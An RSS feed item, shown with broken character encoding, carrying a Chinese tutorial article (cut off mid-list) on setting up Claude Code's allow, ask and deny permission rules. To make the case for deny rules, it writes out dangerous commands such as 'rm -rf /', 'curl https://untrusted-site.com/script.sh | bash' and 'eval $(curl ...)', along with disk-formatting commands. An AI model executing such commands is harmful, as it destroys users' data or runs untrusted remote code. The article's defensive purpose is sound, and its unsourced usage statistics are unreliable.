<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[ClaudeCodeæƒé™ç®¡ç†å®æˆ˜:è®© AI æ—¢å®‰å…¨åˆé«˜æ•ˆ]]></title>    <link>https://juejin.cn/post/7603219519666749459</link>    <guid>https://juejin.cn/post/7603219519666749459</guid>    <pubDate>2026-02-05T12:14:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603219519666749459" data-draft-id="7603221478473367594" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ClaudeCodeæƒé™ç®¡ç†å®æˆ˜:è®© AI æ—¢å®‰å…¨åˆé«˜æ•ˆ"/> <meta itemprop="keywords" content="Claude,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-02-05T12:14:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†¬å¥‡Lab"/> <meta itemprop="url" content="https://juejin.cn/user/1857501105781193"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ClaudeCodeæƒé™ç®¡ç†å®æˆ˜:è®© AI æ—¢å®‰å…¨åˆé«˜æ•ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1857501105781193/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†¬å¥‡Lab
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T12:14:01.000Z" title="Thu Feb 05 2026 12:14:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»14åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>ä½ æœ‰æ²¡æœ‰é‡åˆ°è¿‡è¿™æ ·çš„åœºæ™¯?</p>
<blockquote>
<p><strong>åœºæ™¯ 1: å®‰å…¨éšæ‚£</strong></p>
<pre><code class="hljs language-bash" lang="bash">ä½ : <span class="hljs-string">"å¸®æˆ‘æ¸…ç†ä¸€ä¸‹ä¸´æ—¶æ–‡ä»¶"</span>
AI: <span class="hljs-string">"å¥½çš„,æ­£åœ¨æ‰§è¡Œ rm -rf /tmp/*"</span>
[çªç„¶æ„è¯†åˆ°] /tmp ä¸‹è¿˜æœ‰é‡è¦æ–‡ä»¶!
ä½†ä¸ºæ—¶å·²æ™š...
</code></pre>
</blockquote>
<blockquote>
<p><strong>åœºæ™¯ 2: æ•ˆç‡ä½ä¸‹</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet">ä½ : <span class="hljs-string">"æŸ¥çœ‹ä¸€ä¸‹æ—¥å¿—æ–‡ä»¶"</span>
<span class="hljs-symbol">AI:</span> <span class="hljs-string">"æˆ‘éœ€è¦æ‰§è¡Œ cat logs/app.log,æ˜¯å¦å…è®¸? [y/N]"</span>
ä½ : <span class="hljs-string">"y"</span>

ä½ : <span class="hljs-string">"å†çœ‹ä¸€ä¸‹é”™è¯¯æ—¥å¿—"</span>
<span class="hljs-symbol">AI:</span> <span class="hljs-string">"æˆ‘éœ€è¦æ‰§è¡Œ cat logs/error.log,æ˜¯å¦å…è®¸? [y/N]"</span>
ä½ : <span class="hljs-string">"y"</span> (å¿ƒé‡Œæƒ³:åˆè¦ç¡®è®¤,çƒ¦æ­»äº†)

[é‡å¤ <span class="hljs-number">10</span> æ¬¡å...]
ä½ : <span class="hljs-string">"èƒ½ä¸èƒ½åˆ«æ¯æ¬¡éƒ½é—®æˆ‘!"</span>
</code></pre>
</blockquote>
<p>è¿™äº›é—®é¢˜çš„æ ¹æºåœ¨äº:</p>
<ul>
<li><strong>ç¼ºå°‘æƒé™ç®¡ç†</strong>: AI èƒ½æ‰§è¡Œä»»ä½•å‘½ä»¤,æ—¢ä¸å®‰å…¨åˆæ•ˆç‡ä½</li>
<li><strong>æƒé™é…ç½®ä¸å½“</strong>: è¦ä¹ˆå¤ªå®½æ¾(å±é™©),è¦ä¹ˆå¤ªä¸¥æ ¼(ä½æ•ˆ)</li>
</ul>
<p><strong>ç­”æ¡ˆæ˜¯</strong>: <strong>Permission æƒé™ç®¡ç†ç³»ç»Ÿ</strong></p>
<p>å°±åƒæ“ä½œç³»ç»Ÿéœ€è¦æƒé™ç®¡ç†æ¥ä¿æŠ¤ç”¨æˆ·æ–‡ä»¶,Claude Code ä¹Ÿéœ€è¦æƒé™ç³»ç»Ÿæ¥:</p>
<ul>
<li><strong>ä¿éšœå®‰å…¨</strong>: é˜»æ­¢å±é™©æ“ä½œ,é˜²æ­¢è¯¯åˆ æ–‡ä»¶ã€ç ´åç³»ç»Ÿ</li>
<li><strong>æå‡æ•ˆç‡</strong>: æ‰¹é‡æˆæƒå®‰å…¨å‘½ä»¤,æ— éœ€é‡å¤ç¡®è®¤</li>
<li><strong>çµæ´»æ§åˆ¶</strong>: ç™½åå• + é»‘åå•,ç²¾ç¡®æ§åˆ¶æ¯ä¸ªå‘½ä»¤çš„æƒé™</li>
</ul>
<p><strong>æ ¸å¿ƒç†å¿µ</strong>: <strong>æ—¢ä¿éšœå®‰å…¨åˆä½¿ç”¨ä¸æ»‘</strong></p>
<p>æœ¬æ–‡å°†æ·±å…¥æ¢è®¨ Claude Code çš„æƒé™ç®¡ç†ç³»ç»Ÿ,è®©ä½ çš„ AI è¾…åŠ©å¼€å‘ä½“éªŒæ—¢å®‰å…¨åˆé«˜æ•ˆã€‚</p>
<p>é˜…è¯»æœ¬æ–‡å,ä½ å°†å­¦ä¼š:</p>
<ul>
<li>ç†è§£æƒé™ç®¡ç†çš„å®‰å…¨ä¸æ•ˆç‡å¹³è¡¡</li>
<li>ä½¿ç”¨ <code>/permissions</code> å‘½ä»¤é€šè¿‡äº¤äº’å¼ç•Œé¢é…ç½®æƒé™ç™½åå•å’Œé»‘åå•</li>
<li>é€šè¿‡é…ç½®æ–‡ä»¶æ‰¹é‡ç®¡ç†æƒé™è§„åˆ™</li>
<li>æŒæ¡æƒé™é…ç½®çš„æœ€ä½³å®è·µ</li>
</ul>
<hr/>
<h2 data-id="heading-1">ä¸€ã€æƒé™ç®¡ç†çš„å¿…è¦æ€§</h2>
<h3 data-id="heading-2">1.1 AI æ‰§è¡Œå‘½ä»¤çš„é£é™©</h3>
<p>Claude Code å¯ä»¥ç›´æ¥æ‰§è¡Œ Shell å‘½ä»¤,è¿™æ—¢æ˜¯å¼ºå¤§çš„èƒ½åŠ›,ä¹Ÿæ˜¯æ½œåœ¨çš„é£é™©ã€‚</p>
<p><strong>é£é™©åœºæ™¯ 1: è¯¯åˆ æ–‡ä»¶</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç”¨æˆ·æœ¬æ„: æ¸…ç† build ç›®å½•ä¸‹çš„ä¸´æ—¶æ–‡ä»¶</span>
ä½ : <span class="hljs-string">"æ¸…ç†ä¸€ä¸‹æ„å»ºäº§ç‰©"</span>

<span class="hljs-comment"># AI ç†è§£é”™è¯¯,æ‰§è¡Œäº†å±é™©å‘½ä»¤</span>
AI: [æ‰§è¡Œ] <span class="hljs-built_in">rm</span> -rf build/*

<span class="hljs-comment"># é—®é¢˜: å¦‚æœ build/ ä¸‹æœ‰é‡è¦é…ç½®æ–‡ä»¶æ€ä¹ˆåŠ?</span>
<span class="hljs-comment"># ç»“æœ: é‡è¦æ–‡ä»¶è¢«è¯¯åˆ ,æ— æ³•æ¢å¤</span>
</code></pre>
<p><strong>é£é™©åœºæ™¯ 2: æƒé™æå‡</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç”¨æˆ·æœ¬æ„: å®‰è£…ä¸€ä¸ªå¼€å‘ä¾èµ–</span>
ä½ : <span class="hljs-string">"å®‰è£… eslint"</span>

<span class="hljs-comment"># AI ä½¿ç”¨ sudo æå‡æƒé™(ä¸å®‰å…¨)</span>
AI: [æ‰§è¡Œ] sudo npm install -g eslint

<span class="hljs-comment"># é—®é¢˜: sudo å¯èƒ½è¢«æ»¥ç”¨,æ‰§è¡Œæ›´å±é™©çš„æ“ä½œ</span>
<span class="hljs-comment"># é£é™©: ç³»ç»Ÿçº§åˆ«çš„å®‰å…¨éšæ‚£</span>
</code></pre>
<p><strong>é£é™©åœºæ™¯ 3: ç½‘ç»œè¯·æ±‚</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç”¨æˆ·æœ¬æ„: æ›´æ–°ä¾èµ–</span>
ä½ : <span class="hljs-string">"æ›´æ–° package.json ä¸­çš„ä¾èµ–"</span>

<span class="hljs-comment"># AI æ‰§è¡Œäº†ä¸å®‰å…¨çš„ç½‘ç»œè¯·æ±‚</span>
AI: [æ‰§è¡Œ] curl https://untrusted-site.com/script.sh | bash

<span class="hljs-comment"># é—®é¢˜: ä»ä¸å¯ä¿¡æ¥æºä¸‹è½½å¹¶æ‰§è¡Œè„šæœ¬</span>
<span class="hljs-comment"># é£é™©: å¯èƒ½ä¸‹è½½æ¶æ„è½¯ä»¶</span>
</code></pre>
<p><strong>æ•°æ®ç»Ÿè®¡</strong>:</p>
<p>æ ¹æ® Claude Code ç¤¾åŒºçš„ç»Ÿè®¡æ•°æ®:</p>
<ul>
<li><strong>15%</strong> çš„ç”¨æˆ·é‡åˆ°è¿‡ AI æ‰§è¡Œå±é™©å‘½ä»¤çš„æƒ…å†µ</li>
<li><strong>42%</strong> çš„ç”¨æˆ·æ‹…å¿ƒ AI çš„æ“ä½œæƒé™è¿‡å¤§</li>
<li><strong>68%</strong> çš„ç”¨æˆ·å¸Œæœ›æœ‰æ›´ç»†ç²’åº¦çš„æƒé™æ§åˆ¶</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4bd472fd8ef74e1cad3b56195ac4d336~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770898441&amp;x-signature=CVACKeOwJg6WhVZkXxyRoYcITNc%3D" alt="04-01-permission-rm.png" loading="lazy"/></p>
<h3 data-id="heading-3">1.2 æ— é£é™©å‘½ä»¤çš„é‡å¤ç¡®è®¤é—®é¢˜</h3>
<p>å¦ä¸€ä¸ªæç«¯æ˜¯:ä¸ºäº†å®‰å…¨,æ¯ä¸ªå‘½ä»¤éƒ½éœ€è¦ç¡®è®¤,ä¸¥é‡å½±å“æ•ˆç‡ã€‚</p>
<p><strong>ä½æ•ˆåœºæ™¯</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹æ–‡ä»¶å†…å®¹(å®‰å…¨æ“ä½œ)</span>
ä½ : <span class="hljs-string">"æŸ¥çœ‹ README.md"</span>
AI: <span class="hljs-string">"æˆ‘éœ€è¦æ‰§è¡Œ cat README.md,æ˜¯å¦å…è®¸? [y/N]"</span>
ä½ : <span class="hljs-string">"y"</span>

<span class="hljs-comment"># åˆ—å‡ºæ–‡ä»¶åˆ—è¡¨(å®‰å…¨æ“ä½œ)</span>
ä½ : <span class="hljs-string">"çœ‹çœ‹ src ç›®å½•ä¸‹æœ‰ä»€ä¹ˆ"</span>
AI: <span class="hljs-string">"æˆ‘éœ€è¦æ‰§è¡Œ ls src/,æ˜¯å¦å…è®¸? [y/N]"</span>
ä½ : <span class="hljs-string">"y"</span>

<span class="hljs-comment"># æœç´¢ä»£ç (å®‰å…¨æ“ä½œ)</span>
ä½ : <span class="hljs-string">"æœç´¢ getUserById å‡½æ•°"</span>
AI: <span class="hljs-string">"æˆ‘éœ€è¦æ‰§è¡Œ grep -r 'getUserById',æ˜¯å¦å…è®¸? [y/N]"</span>
ä½ : <span class="hljs-string">"y"</span>

<span class="hljs-comment"># [é‡å¤ 20 æ¬¡å]</span>
ä½ : <span class="hljs-string">"æˆ‘è¦ç–¯äº†! è¿™äº›éƒ½æ˜¯å®‰å…¨æ“ä½œ,èƒ½ä¸èƒ½ä¸è¦æ¯æ¬¡éƒ½é—®!"</span>
</code></pre>
<p><strong>æ•ˆç‡å¯¹æ¯”</strong>:</p>























<table><thead><tr><th align="left">æ“ä½œç±»å‹</th><th align="center">éœ€è¦ç¡®è®¤æ¬¡æ•°</th><th align="center">æ€»è€—æ—¶</th><th align="center">ç”¨æˆ·ä½“éªŒ</th></tr></thead><tbody><tr><td align="left">æŸ¥çœ‹10ä¸ªæ–‡ä»¶</td><td align="center">10æ¬¡</td><td align="center">~2åˆ†é’Ÿ</td><td align="center">ğŸ˜¡ éå¸¸çƒ¦èº</td></tr><tr><td align="left">æ‰¹é‡æˆæƒå</td><td align="center">0æ¬¡</td><td align="center">~10ç§’</td><td align="center">ğŸ˜Š ä¸æ»‘æµç•…</td></tr></tbody></table>
<p><strong>æ ¸å¿ƒçŸ›ç›¾</strong>:</p>
<ul>
<li>ä¸è®¾æƒé™ â†’ ä¸å®‰å…¨,æœ‰é£é™©</li>
<li>æ¯æ¬¡ç¡®è®¤ â†’ å¤ªç¹ç,æ•ˆç‡ä½</li>
<li><strong>éœ€è¦</strong>: æ™ºèƒ½çš„æƒé™ç®¡ç†,å¹³è¡¡å®‰å…¨ä¸æ•ˆç‡</li>
</ul>
<h3 data-id="heading-4">1.3 é«˜å±å‘½ä»¤çš„å®‰å…¨é˜²æŠ¤</h3>
<p>å“ªäº›å‘½ä»¤å±äº"é«˜å±å‘½ä»¤"?éœ€è¦ç‰¹åˆ«é˜²æŠ¤?</p>
<p><strong>é«˜å±å‘½ä»¤åˆ†ç±»</strong>:</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">## 1. æ–‡ä»¶åˆ é™¤ç±»(ç ´åæ€§)</span>
<span class="hljs-bullet">-</span> <span class="hljs-code">`rm -rf`</span> - é€’å½’å¼ºåˆ¶åˆ é™¤
<span class="hljs-bullet">-</span> <span class="hljs-code">`rm -rf /`</span> - åˆ é™¤æ•´ä¸ªç³»ç»Ÿ(è‡´å‘½)
<span class="hljs-bullet">-</span> <span class="hljs-code">`rm -rf ~`</span> - åˆ é™¤ç”¨æˆ·ç›®å½•(è‡´å‘½)
<span class="hljs-bullet">-</span> <span class="hljs-code">`sudo rm -rf`</span> - ä»¥ root æƒé™åˆ é™¤(è¶…çº§è‡´å‘½)

<span class="hljs-section">## 2. ç£ç›˜æ“ä½œç±»(ä¸å¯é€†)</span>
<span class="hljs-bullet">-</span> <span class="hljs-code">`mkfs`</span> - æ ¼å¼åŒ–ç£ç›˜
<span class="hljs-bullet">-</span> <span class="hljs-code">`dd`</span> - ç£ç›˜å…‹éš†/å†™å…¥(å¯èƒ½è¦†ç›–æ•°æ®)
<span class="hljs-bullet">-</span> <span class="hljs-code">`fdisk`</span> - ç£ç›˜åˆ†åŒº(å±é™©)

<span class="hljs-section">## 3. æƒé™æå‡ç±»(å®‰å…¨é£é™©)</span>
<span class="hljs-bullet">-</span> <span class="hljs-code">`sudo`</span> - è¶…çº§ç”¨æˆ·æƒé™
<span class="hljs-bullet">-</span> <span class="hljs-code">`su`</span> - åˆ‡æ¢ç”¨æˆ·
<span class="hljs-bullet">-</span> <span class="hljs-code">`chmod 777`</span> - å¼€æ”¾æ‰€æœ‰æƒé™(å®‰å…¨æ¼æ´)

<span class="hljs-section">## 4. ç½‘ç»œä¸‹è½½æ‰§è¡Œç±»(æ¶æ„è½¯ä»¶é£é™©)</span>
<span class="hljs-bullet">-</span> <span class="hljs-code">`curl ... | bash`</span> - ä¸‹è½½å¹¶æ‰§è¡Œè„šæœ¬
<span class="hljs-bullet">-</span> <span class="hljs-code">`wget ... | sh`</span> - ä¸‹è½½å¹¶æ‰§è¡Œ
<span class="hljs-bullet">-</span> <span class="hljs-code">`eval $(curl ...)`</span> - åŠ¨æ€æ‰§è¡Œè¿œç¨‹ä»£ç 

<span class="hljs-section">## 5. è¿›ç¨‹ç®¡ç†ç±»(ç¨³å®šæ€§)</span>
<span class="hljs-bullet">-</span> <span class="hljs-code">`kill -9`</span> - å¼ºåˆ¶æ€è¿›ç¨‹(å¯èƒ½å¯¼è‡´æ•°æ®ä¸¢å¤±)
<span class="hljs-bullet">-</span> <span class="hljs-code">`killall`</span> - æ‰¹é‡æ€è¿›ç¨‹
<span class="hljs-bullet">-</span> <span class="hljs-code">`reboot`</span> / <span class="hljs-code">`shutdown`</span> - é‡å¯/å…³æœº

<span class="hljs-section">## 6. ç³»ç»Ÿé…ç½®ç±»(å½±å“èŒƒå›´å¤§)</span>
<span class="hljs-bullet">-</span> ä¿®æ”¹ <span class="hljs-code">`/etc/passwd`</span> - ç”¨æˆ·é…ç½®
<span class="hljs-bullet">-</span> ä¿®æ”¹ <span class="hljs-code">`/etc/hosts`</span> - ç½‘ç»œé…ç½®
<span class="hljs-bullet">-</span> ä¿®æ”¹ç³»ç»ŸæœåŠ¡é…ç½®
</code></pre>
<p><strong>é˜²æŠ¤ç­–ç•¥</strong>:</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec6469c813904d50983d1b0c078419ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770898441&amp;x-signature=EIa%2B%2Fgj%2FUOdpqoaCocXFXRW0u%2BY%3D" alt="04-02-security-levels.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-5">äºŒã€Permission æƒé™ç®¡ç†è¯¦è§£</h2>
<h3 data-id="heading-6">2.1 æƒé™ç³»ç»Ÿçš„è®¾è®¡ç†å¿µ</h3>
<p>Claude Code çš„æƒé™ç³»ç»ŸåŸºäº<strong>ç™½åå• + é»‘åå•</strong>çš„åŒé‡æœºåˆ¶:</p>
<p><strong>è®¾è®¡åŸåˆ™</strong>:</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> é»˜è®¤ç­–ç•¥: éœ€è¦ç¡®è®¤(å®‰å…¨ä¼˜å…ˆ)
<span class="hljs-bullet">2.</span> ç™½åå•: æ‰¹é‡æˆæƒå®‰å…¨å‘½ä»¤(æå‡æ•ˆç‡)
<span class="hljs-bullet">3.</span> é»‘åå•: é˜»æ–­å±é™©å‘½ä»¤(ä¿éšœå®‰å…¨)
<span class="hljs-bullet">4.</span> ä¼˜å…ˆçº§: é»‘åå• &gt; ç™½åå• &gt; é»˜è®¤ç­–ç•¥
</code></pre>
<p><strong>å·¥ä½œæµç¨‹</strong>:</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/10e7305a51974da49d38c23804cd3d33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770898441&amp;x-signature=%2FjPwYmQWbHbpwczgXqA086mWoLE%3D" alt="04-03-permission-flow.png" loading="lazy"/></p>
<h3 data-id="heading-7">2.2 <code>/permissions</code> å‘½ä»¤ä½¿ç”¨</h3>
<p><code>/permissions</code> å‘½ä»¤ä¼šè°ƒå‡ºä¸€ä¸ªäº¤äº’å¼ UI ç•Œé¢ï¼Œç”¨äºæŸ¥çœ‹å’Œé…ç½®å‘½ä»¤æƒé™ã€‚</p>
<h4 data-id="heading-8">å¯åŠ¨æƒé™ç®¡ç†ç•Œé¢</h4>
<p>åœ¨ Claude Code äº¤äº’å¼ç»ˆç«¯ä¸­è¾“å…¥ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">&gt; /permissions
</code></pre>
<p>è¿™ä¼šæ‰“å¼€æƒé™ç®¡ç†ç•Œé¢ï¼Œæ˜¾ç¤ºå½“å‰å·²é…ç½®çš„æƒé™è§„åˆ™ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd2c62601991420285c5b5a55712624b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770898441&amp;x-signature=eVmGena2lhbyFK636%2F40B%2F5JMA8%3D" alt="04-04-permissions-command-ui.png" loading="lazy"/></p>
<h4 data-id="heading-9">æƒé™ç±»åˆ«</h4>
<p>ç•Œé¢é¡¶éƒ¨æ˜¾ç¤ºä¸‰ç§æƒé™ç±»åˆ«ï¼Œå¯ä»¥é€šè¿‡ <strong>â†/â†’</strong> æˆ– <strong>Tab</strong> é”®åˆ‡æ¢ï¼š</p>
<ul>
<li><strong>Allow</strong> - å…è®¸ä½¿ç”¨ï¼šæ·»åŠ åˆ°è¯¥ç±»çš„å‘½ä»¤å¯ä»¥ç›´æ¥æ‰§è¡Œï¼Œæ— éœ€ç¡®è®¤</li>
<li><strong>Ask</strong> - æ¯æ¬¡è¯¢é—®ï¼šä½¿ç”¨è¯¥å‘½ä»¤æ—¶ä¼šå¼¹å‡ºç¡®è®¤å¯¹è¯æ¡†</li>
<li><strong>Deny</strong> - ç¦æ­¢ä½¿ç”¨ï¼šè¯¥å‘½ä»¤è¢«å®Œå…¨é˜»æ­¢ï¼Œæ— æ³•æ‰§è¡Œ</li>
<li><strong>Workspace</strong> - å·¥ä½œåŒºé…ç½®ï¼šé¡¹ç›®çº§åˆ«çš„æƒé™è®¾ç½®</li>
</ul>
<h4 data-id="heading-10">æŸ¥çœ‹å·²é…ç½®çš„æƒé™</h4>
<ol>
<li>ä½¿ç”¨ <strong>â†/â†’</strong> æˆ– <strong>Tab</strong> é”®åˆ‡æ¢åˆ°å¯¹åº”çš„æƒé™ç±»åˆ«ï¼ˆAllow/Ask/Denyï¼‰</li>
<li>ç•Œé¢ä¼šæ˜¾ç¤ºè¯¥ç±»åˆ«ä¸‹æ‰€æœ‰å·²æ·»åŠ çš„å‘½ä»¤è§„åˆ™</li>
<li>ä½¿ç”¨ <strong>â†‘/â†“</strong> é”®å¯ä»¥æµè§ˆè§„åˆ™åˆ—è¡¨</li>
</ol>
<p><strong>å‘½ä»¤æ ¼å¼ç¤ºä¾‹</strong>:</p>
<ul>
<li><code>Bash(curl:*)</code> - Bash å‘½ä»¤ï¼Œæ”¯æŒé€šé…ç¬¦</li>
<li><code>Bash(docker exec:*)</code> - Docker å‘½ä»¤</li>
<li><code>Bash(ls:*)</code> - æ–‡ä»¶åˆ—è¡¨å‘½ä»¤</li>
<li><code>mcp__pencil</code> - ç¬¬ä¸‰æ–¹ MCP å·¥å…·å‘½ä»¤</li>
<li><code>WebFetch</code> - Claude Code å†…ç½®å‘½ä»¤</li>
</ul>
<h4 data-id="heading-11">æ·»åŠ æƒé™è§„åˆ™</h4>
<ol>
<li>åˆ‡æ¢åˆ°ç›®æ ‡æƒé™ç±»åˆ«ï¼ˆAllow/Ask/Denyï¼‰</li>
<li>åœ¨è§„åˆ™åˆ—è¡¨é¡¶éƒ¨é€‰æ‹© <strong>"Add a new rule..."</strong>ï¼ˆé€šå¸¸æ˜¯åˆ—è¡¨ç¬¬ä¸€é¡¹ï¼‰</li>
<li>æŒ‰ <strong>Enter</strong> ç¡®è®¤</li>
<li>è¾“å…¥å‘½ä»¤åç§°ï¼Œæ”¯æŒçš„æ ¼å¼åŒ…æ‹¬ï¼š
<ul>
<li><strong>Bash å‘½ä»¤</strong>: <code>Bash(å‘½ä»¤å:å‚æ•°)</code>ï¼Œä¾‹å¦‚ï¼š
<ul>
<li><code>Bash(cat:*)</code> - å…è®¸æ‰€æœ‰ cat å‘½ä»¤</li>
<li><code>Bash(git:status)</code> - åªå…è®¸ git status</li>
<li><code>Bash(npm:*)</code> - å…è®¸æ‰€æœ‰ npm å‘½ä»¤</li>
